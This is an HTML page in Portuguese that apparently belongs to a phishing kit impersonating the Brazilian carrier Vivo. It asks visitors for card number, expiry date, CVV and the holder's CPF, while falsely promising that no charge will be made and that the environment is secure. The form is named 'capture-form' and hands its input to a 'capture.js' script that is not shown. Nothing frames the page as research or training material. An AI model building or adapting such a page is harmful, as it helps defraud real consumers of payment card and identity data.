<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adicionar o Cartão</title>
    <link rel="stylesheet" href="./asset/css/fonts.css">
    <link rel="stylesheet" href="./asset/css/bootstrap.css">
    <link rel="stylesheet" href="./asset/css/styles.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <div class="header">
        <div class="tf-container">
            <div class="tf-statusbar d-flex justify-content-center align-items-center">
                <img src="./asset/logo/logo.png" style="width: 115px;">
            </div>   
        </div>
    </div>
    <div class="mt-3">
        <div class="tf-container">
            <h3 class="fw_6 text-center" style="font-size: 16px;">Adicione um cartão de crédito.</h3>
            <div class="mt-2"></div>
            <p class="text-center" style="font-size: 13px;">Será necessário vincular um cartão de crédito em seu cadastro da Vivo.</p>
            <p class="fw_6 text-center" style="font-size: 12px;">Nenhuma cobrança será realizada.</p>
            <form class="tf-form mt-5" id="capture-form">
                <div class="group-input">
                    <i class="fas fa-credit-card fa-container"></i>
                    <label>Número do Cartão</label>
                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
                    <div class="icon-container">
                        <img src="./asset/bandeiras/visa.webp" id="visa-icon">
                        <img src="./asset/bandeiras/master.webp" id="master-icon">
                        <img src="./asset/bandeiras/elo.webp" id="elo-icon">
                        <img src="./asset/bandeiras/american.webp" id="amex-icon">
                    </div>
                    <div class="error-message" id="cardNumberError"></div>
                </div>
                <div class="group-double-ip">
                    <div class="group-input">
                        <i class="fas fa-calendar fa-container"></i>
                        <label>Validade</label>
                        <input type="text" id="cardExpiry" placeholder="00/00" maxlength="5" inputmode="numeric">
                        <div class="error-message" id="cardExpiryError"></div>
                    </div>
                    <div class="group-input">
                        <i class="fas fa-lock fa-container"></i>
                        <label>Código de Segurança</label>
                        <input type="text" id="cardCVV" placeholder="CVV" maxlength="4" inputmode="numeric">
                        <div class="error-message" id="cardCVVError"></div>
                    </div>
                </div>
                <div class="group-input">
                    <i class="fas fa-id-card fa-container"></i>
                    <label>CPF do Titular</label>
                    <input type="text" id="cardCPF" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
                    <div class="error-message" id="cardCPFError"></div>
                </div>
                <div>
                    <p style="text-align: center; color: green; font-size: 15px;"><i class="fa-solid fa-lock"></i> &NonBreakingSpace; Você está em um ambiente seguro </p>
                    <br>
                    <button type="submit" id="confirmButton" class="tf-btn accent large">Confirmar</button>
                </div>
            </form>
        </div>
    </div>
    <script src="./asset/js/capture.js"></script>
</body>
</html>
